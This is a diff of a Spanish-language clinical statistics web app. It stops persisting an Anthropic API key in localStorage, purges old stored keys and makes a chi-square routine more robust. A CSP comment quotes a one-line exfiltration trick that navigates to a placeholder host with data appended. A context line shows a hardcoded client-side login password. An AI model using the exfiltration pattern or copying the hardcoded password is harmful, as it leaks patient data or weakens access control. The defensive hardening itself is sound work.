@@ -9,14 +9,17 @@
 <!-- ══════════════════════════════════════════════════════════════════════════
      Content Security Policy
 
-     El objetivo principal acá es `connect-src`: la clave de la API de Anthropic vive
-     en localStorage y la app maneja datos de pacientes de cuatro apps. `connect-src`
-     cierra los canales de exfiltración silenciosos —fetch, XHR, sendBeacon, WebSocket—
-     y `img-src` cierra la baliza de imagen, que es el truco más simple. Sube mucho el
-     costo de un XSS, pero NO lo anula: la exfiltración por navegación
-     (`location = 'https://otro/#'+clave`) no la bloquea ninguna directiva de CSP;
-     `navigate-to` nunca se implementó y se sacó de CSP3. Si la clave es lo que más
-     preocupa, la pieza que falta es no dejarla en localStorage de forma permanente.
+     El objetivo principal acá es `connect-src`: la app maneja datos de pacientes de
+     cuatro apps. `connect-src` cierra los canales de exfiltración silenciosos —fetch,
+     XHR, sendBeacon, WebSocket— y `img-src` cierra la baliza de imagen, que es el truco
+     más simple. Sube mucho el costo de un XSS, pero NO lo anula: la exfiltración por
+     navegación (`location = 'https://otro/#'+dato`) no la bloquea ninguna directiva de
+     CSP; `navigate-to` nunca se implementó y se sacó de CSP3.
+
+     La clave de la API de Anthropic YA NO se persiste (2026-09-02): vive en una variable
+     en memoria, se pide en cada sesión y la que hubiera quedado de versiones anteriores
+     se borra al arrancar. Lo que `connect-src` protege hoy son los datos clínicos, no un
+     secreto en disco — no volver a persistirla creyendo que la CSP alcanza.
 
      Encuadre para quien mantenga esto: acá `script-src` es un control de cadena de
      suministro (quién puede CARGAR scripts), no un control de XSS. El control de XSS
@@ -628,6 +631,13 @@ td.num,th.num{text-align:right;font-variant-numeric:tabular-nums;}
 </div>
 
 <script>
+/* Borrado de la clave de Anthropic que hubiera quedado persistida por versiones anteriores.
+   Va ACÁ, en el primer <script> y antes de todo lo demás, y no junto al resto del manejo de
+   la clave: aquel bloque está 4.300 líneas dentro de un IIFE enorme, así que cualquier
+   excepción previa —y en esta app ya hubo una que cortó un script entero— se lo saltea. El
+   único usuario a quien este borrado le importa es el que YA tenía el secreto en disco, y a
+   ése la app le diría «no queda guardada» mientras sigue ahí. */
+try{ localStorage.removeItem('ca_anthropic_key'); }catch(e){}
 (function(){
   const PWD = 'ceibo1';
   const btn = document.getElementById('login-btn');
@@ -1253,10 +1263,11 @@ td.num,th.num{text-align:right;font-variant-numeric:tabular-nums;}
         <div id="est-panel-ia" style="display:none;">
           <div class="card" style="margin-bottom:16px;">
             <h3 class="section" style="font-size:15px;">Configuración — API key de Anthropic</h3>
-            <div style="font-size:12px;color:var(--text-2);margin-bottom:8px;">Se guarda solo en este navegador (localStorage). Nunca se envía a otro servidor salvo la propia API de Anthropic.</div>
+            <div style="font-size:12px;color:var(--text-2);margin-bottom:8px;">No se guarda: vive sólo en memoria durante esta sesión y se pide de nuevo al recargar. Nunca se envía a otro servidor salvo la propia API de Anthropic.</div>
             <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
-              <input type="password" id="est-api-key" placeholder="sk-ant-..." style="flex:1;min-width:240px;padding:8px;border:1px solid var(--border);border-radius:8px;background:var(--surface-2);color:var(--text-1);">
-              <button class="btn" onclick="estGuardarKey()">Guardar clave</button>
+              <input type="password" id="est-api-key" placeholder="sk-ant-..." autocomplete="off" data-1p-ignore data-lpignore="true" spellcheck="false" style="flex:1;min-width:240px;padding:8px;border:1px solid var(--border);border-radius:8px;background:var(--surface-2);color:var(--text-1);">
+              <button class="btn" onclick="estGuardarKey()">Usar en esta sesión</button>
+              <button class="btn" onclick="estBorrarKey()">Borrar</button>
               <span id="est-key-status" style="font-size:12px;color:var(--text-2);"></span>
             </div>
           </div>
@@ -4763,7 +4774,29 @@ const PSAPstr=pr=>{ const d=eeF(pr.ecoestres,'delta_psap'); if(d!=null)return d;
   }
   function spearman(pairs){const n=pairs.length;if(n<3)return null;const rx=ranks(pairs.map(p=>p[0])),ry=ranks(pairs.map(p=>p[1]));const mx=avg(rx),my=avg(ry);let sxy=0,sxx=0,syy=0;for(let i=0;i<n;i++){sxy+=(rx[i]-mx)*(ry[i]-my);sxx+=(rx[i]-mx)**2;syy+=(ry[i]-my)**2;}if(sxx===0||syy===0)return{err:'const',n};const rho=sxy/Math.sqrt(sxx*syy);const z=Math.abs(rho)*Math.sqrt(n-1);return{rho,p:Math.max(0,Math.min(1,2*(1-normCdf(z)))),n,ci:fisherCI(rho,n)};}
   function mannwhitney(g1,g2){const n1=g1.length,n2=g2.length,N=n1+n2;if(n1<1||n2<1)return null;const all=g1.map(v=>[v,0]).concat(g2.map(v=>[v,1]));const r=ranks(all.map(a=>a[0]));let R1=0;for(let i=0;i<N;i++)if(all[i][1]===0)R1+=r[i];const U1=R1-n1*(n1+1)/2,U2=n1*n2-U1,U=Math.min(U1,U2),mU=n1*n2/2;const sv=all.map(a=>a[0]).sort((a,b)=>a-b);let tie=0,i=0;while(i<N){let j=i;while(j+1<N&&sv[j+1]===sv[i])j++;const t=j-i+1;if(t>1)tie+=t*t*t-t;i=j+1;}const sU=Math.sqrt((n1*n2/12)*((N+1)-tie/(N*(N-1)||1)));if(sU===0)return{err:'const',n1,n2};const z=(Math.abs(U-mU)-0.5)/sU;return{U,p:Math.max(0,Math.min(1,2*(1-normCdf(z)))),n1,n2};}
-  function chi2test(tbl){const R=tbl.length,C=tbl[0].length;const rt=tbl.map(r=>r.reduce((a,b)=>a+b,0)),ct=[];for(let c=0;c<C;c++){let s=0;for(let r=0;r<R;r++)s+=tbl[r][c];ct.push(s);}const N=rt.reduce((a,b)=>a+b,0);if(N===0)return null;let chi2=0,minE=Infinity;for(let r=0;r<R;r++)for(let c=0;c<C;c++){const e=rt[r]*ct[c]/N;if(e>0){minE=Math.min(minE,e);chi2+=(tbl[r][c]-e)**2/e;}}const df=(R-1)*(C-1);if(df<1)return null;return{chi2,p:chi2p(chi2,df),df,N,minE};}
+  /* Filas y columnas con marginal CERO se descartan antes de contar los grados de libertad.
+     Por el camino de la app esto no cambia nada: la tabla se arma con `[...new Set(...)]`
+     sobre los casos completos, así que un nivel sin ningún caso no llega a existir. Es una
+     guarda para el próximo llamador —una tabla armada a partir de los niveles declarados de
+     la variable, en vez de los observados, traería filas vacías— y el modo de falla es
+     silencioso hacia el lado conservador: gl inflados agrandan el valor crítico, así que el p
+     sale más grande y la asociación se pierde sin que nada avise. */
+  function chi2test(tbl){
+    /* La validación va ANTES de tocar tbl[0]: con una tabla vacía, calcular fOk/cOk primero
+       tiraba TypeError y la guarda de abajo no se alcanzaba nunca. */
+    if(!Array.isArray(tbl)||!tbl.length||!Array.isArray(tbl[0])||!tbl[0].length) return null;
+    const C0=tbl[0].length;
+    /* Una celda NaN hace que la suma sea NaN y que `>0` sea false, o sea que la fila se
+       descartaría COMO SI estuviera vacía: antes eso salía en pantalla como «χ²=NaN», que es
+       imposible de ignorar, y pasaría a ser un χ² y un p verosímiles calculados sobre un
+       subconjunto. Basura no es lo mismo que vacío: se aborta, no se recorta. */
+    if(tbl.some(r=>!Array.isArray(r)||r.length!==C0||r.some(v=>!Number.isFinite(v)||v<0))) return null;
+    const fOk=tbl.map(r=>r.reduce((a,b)=>a+b,0)>0);
+    const cOk=tbl[0].map((_,c)=>tbl.reduce((a,r)=>a+r[c],0)>0);
+    if(fOk.some(v=>!v)||cOk.some(v=>!v))
+      tbl=tbl.filter((_,i)=>fOk[i]).map(r=>r.filter((_,j)=>cOk[j]));
+    if(!tbl.length||!tbl[0].length) return null;
+    const R=tbl.length,C=tbl[0].length;const rt=tbl.map(r=>r.reduce((a,b)=>a+b,0)),ct=[];for(let c=0;c<C;c++){let s=0;for(let r=0;r<R;r++)s+=tbl[r][c];ct.push(s);}const N=rt.reduce((a,b)=>a+b,0);if(N===0)return null;let chi2=0,minE=Infinity;for(let r=0;r<R;r++)for(let c=0;c<C;c++){const e=rt[r]*ct[c]/N;if(e>0){minE=Math.min(minE,e);chi2+=(tbl[r][c]-e)**2/e;}}const df=(R-1)*(C-1);if(df<1)return null;return{chi2,p:chi2p(chi2,df),df,N,minE,filas:R,cols:C};}
   function kruskal(gs){gs=gs.filter(g=>g.length>0);if(gs.length<2)return null;const all=[];gs.forEach((g,gi)=>g.forEach(v=>all.push([v,gi])));const N=all.length;if(N<3)return null;const r=ranks(all.map(a=>a[0]));const Rg=new Array(gs.length).fill(0),ng=gs.map(g=>g.length);for(let i=0;i<N;i++)Rg[all[i][1]]+=r[i];let H=0;for(let g=0;g<gs.length;g++)H+=Rg[g]**2/ng[g];H=12/(N*(N+1))*H-3*(N+1);const sv=all.map(a=>a[0]).sort((a,b)=>a-b);let tie=0,i=0;while(i<N){let j=i;while(j+1<N&&sv[j+1]===sv[i])j++;const t=j-i+1;if(t>1)tie+=t*t*t-t;i=j+1;}const cf=1-tie/(N**3-N);if(cf===0)return{err:'const',N};if(cf>0)H/=cf;const df=gs.length-1;return{H,p:chi2p(H,df),N,k:gs.length};}
 
   /* ══════════════════════════════════════════════════════════════════════════
@@ -6161,8 +6194,8 @@ const PSAPstr=pr=>{ const d=eeF(pr.ecoestres,'delta_psap'); if(d!=null)return d;
     const ci=document.getElementById('est-crossinfo');
     if(ci)ci.innerHTML='<div style="font-size:13px;"><b>Datos cruzados por CI:</b> '+_ecoErgo.length+' pacientes con <b>Eco+Ergo</b> · '+_eeErgo.length+' con <b>EcoEstrés+Ergo</b>'+
       ' en el corte vigente (de '+estBase().length+' estudios). Importados en total: '+((typeof STUDIES!=='undefined')?STUDIES.length:'—')+'.</div>';
-    const k=localStorage.getItem('ca_anthropic_key')||'';
-    const st=document.getElementById('est-key-status'); if(st)st.textContent=k?('Clave guardada: sk-ant-…'+k.slice(-4)):'Sin clave configurada.';
+    const k=(typeof caGetKey==='function'?caGetKey():'')||'';
+    estKeyStatus();   // una sola fuente del texto: duplicado, el próximo cambio entra en uno solo
     /* Después de computeAll: estBaseStudies() ya refleja el período vigente, así que la
        firma se compara contra la población nueva y no contra la que se está dejando. */
     estChequearFirma();
@@ -7911,7 +7944,7 @@ const PSAPstr=pr=>{ const d=eeF(pr.ecoestres,'delta_psap'); if(d!=null)return d;
 
   window.mvInterpretarIA=async function(){
     if(!_mvUlt){ toast('Ajustá un modelo primero'); return; }
-    const key=localStorage.getItem('ca_anthropic_key')||'';
+    const key=(typeof caGetKey==='function'?caGetKey():'')||'';
     if(!key){ toast('Configurá la API key en Análisis IA'); return; }
     const b=document.getElementById('mv-ia'), sp=document.getElementById('mv-ia-spinner'), out=document.getElementById('mv-ia-out');
     const {r,sel,epv,colin,perdidos}=_mvUlt;
@@ -8845,7 +8878,39 @@ const PSAPstr=pr=>{ const d=eeF(pr.ecoestres,'delta_psap'); if(d!=null)return d;
   window.estExportPDF=function(){ if(!window.jspdf||!window.jspdf.jsPDF){toast('❌ PDF no disponible');return;} const rows=filtered(); if(!rows.length){toast('⚠️ Sin filas');return;} const doc=pdfDoc({orientation:'landscape',unit:'mm',format:'a4'}); const mL=10; let y=16; doc.setFont('helvetica','bold');doc.setFontSize(13);doc.setTextColor(20,40,80);doc.text('CeiboAnalytics — Asociaciones estadísticas',mL,y);y+=6; doc.setFont('helvetica','normal');doc.setFontSize(8);doc.setTextColor(90,90,90); doc.text('Eco+Ergo: '+_ecoErgo.length+' pacientes · EcoEstres+Ergo: '+_eeErgo.length+'. SI=sobrevive FDR / si (no FDR)=sig. sin corregir / si (N bajo)=N insuficiente / no=no sig.',mL,y);y+=7; const cols=[['Asociacion',60],['N',11],['Metodo',30],['Estadistico',36],['p',16],['q (FDR)',16],['IC 95%',30],['Sig',18]]; const head=()=>{doc.setFont('helvetica','bold');doc.setFontSize(8);doc.setTextColor(20,40,80);let x=mL;cols.forEach(c=>{doc.text(c[0],x,y);x+=c[1];});y+=1.5;doc.setDrawColor(200);doc.line(mL,y,mL+cols.reduce((a,c)=>a+c[1],0),y);y+=4;}; head(); doc.setFont('helvetica','normal');doc.setFontSize(8);doc.setTextColor(30,30,30); rows.forEach(r=>{ if(y>195){doc.addPage();y=16;head();doc.setFont('helvetica','normal');doc.setTextColor(30,30,30);} const sg=SIG_PDF(r); const vals=[r.lbl,String(r.n),r.method,r.stat,pTxt(r.p),pTxt(r.q),r.ci,sg]; let x=mL; vals.forEach((v,i)=>{doc.text(pdfCelda(doc,v,cols[i][1]),x,y);x+=cols[i][1];}); y+=5; }); doc.save('ceiboanalytics_asociaciones.pdf'); toast('✅ PDF exportado'); };
 
   // ── Análisis IA ──
-  window.estGuardarKey=function(){ const inp=document.getElementById('est-api-key'); const k=(inp.value||'').trim(); if(!k){toast('Ingresá una clave');return;} localStorage.setItem('ca_anthropic_key',k); inp.value=''; document.getElementById('est-key-status').textContent='Clave guardada: sk-ant-…'+k.slice(-4); toast('✅ Clave guardada (solo en este navegador)'); };
+  /* ── Clave de Anthropic: SÓLO en memoria ──
+     Vivía en localStorage bajo `ca_anthropic_key`, sin caducidad y sin forma de borrarla
+     desde la UI: cualquier XSS en la app la leía en una línea, y quedaba ahí para siempre en
+     la máquina del consultorio. Ahora vive en esta variable y nada más — al recargar se pide
+     de nuevo, que es el costo aceptado a cambio de que no haya un secreto persistido.
+     Esto ADELANTA la decisión que estaba diferida a la migración a Supabase; allá la clave
+     deja de estar en el navegador y las llamadas salen del backend. */
+  let CA_API_KEY = '';
+  /* NO se cuelga de window. Los tres consumidores viven en este mismo IIFE, así que la clave
+     nunca necesita salir del closure — y colgarla la vuelve accesible desde la consola y
+     desde los tres scripts de CDN que la CSP habilita, con una sola llamada. Todo el punto
+     del cambio es subir el costo de un XSS; exponerla lo bajaba de nuevo.
+     Declaración de función y no `const caGetKey = …`: los tres llamadores la consultan con
+     `typeof caGetKey==='function'`, y sobre un const en TDZ ese typeof LANZA. */
+  function caGetKey(){ return CA_API_KEY; }
+  function estKeyStatus(){
+    const st=document.getElementById('est-key-status');
+    /* El sufijo sólo con una clave larga: con una pegada a medias, slice(-4) imprimía el
+       valor entero con aspecto de estar enmascarado. */
+    if(st) st.textContent = !CA_API_KEY ? 'Sin clave. Se pide en cada sesión y no queda guardada.'
+      : (CA_API_KEY.length>=8 ? 'Clave activa en esta sesión: sk-ant-…'+CA_API_KEY.slice(-4)
+                              : 'Clave activa en esta sesión.');
+  }
+  window.estGuardarKey=function(){
+    const inp=document.getElementById('est-api-key');
+    if(!inp){ toast('No se encontró el campo de la clave'); return; }
+    const k=(inp.value||'').trim();
+    if(!k){toast('Ingresá una clave');return;}
+    CA_API_KEY=k; inp.value='';
+    estKeyStatus();
+    toast('✅ Clave activa en esta sesión (no se guarda)');
+  };
+  window.estBorrarKey=function(){ CA_API_KEY=''; estKeyStatus(); toast('Clave borrada de la sesión'); };
   function resumenAsoc(){ const sig=_results.filter(r=>r.p!=null&&r.p<0.05); const strong=_results.filter(r=>r.coef!=null&&Math.abs(r.coef)>0).sort((a,b)=>Math.abs(b.coef)-Math.abs(a.coef)); return {ecoErgo:_ecoErgo.length,eeErgo:_eeErgo.length,total:_results.length,significativas:sig.length,masFuerte:strong[0]||null,sig,todas:_results}; }
 
   /* ── Corrección por comparaciones múltiples (Benjamini-Hochberg) ──
@@ -9295,7 +9360,7 @@ const PSAPstr=pr=>{ const d=eeF(pr.ecoestres,'delta_psap'); if(d!=null)return d;
     const el=document.getElementById('est-informe-ia');
     const hd=document.getElementById('est-ia-out-h');
     if(!cfg){ toast('Modo desconocido'); return; }
-    const key=localStorage.getItem('ca_anthropic_key');
+    const key=(typeof caGetKey==='function'?caGetKey():'');
     if(!key){ el.textContent='Configurá tu API key de Anthropic para usar esta función.'; estNoEsInforme('est-informe-ia'); hd.textContent=''; hd.style.display='none'; toast('Falta la API key'); return; }
     computeAll();
     const payload=ctxIA(modo);
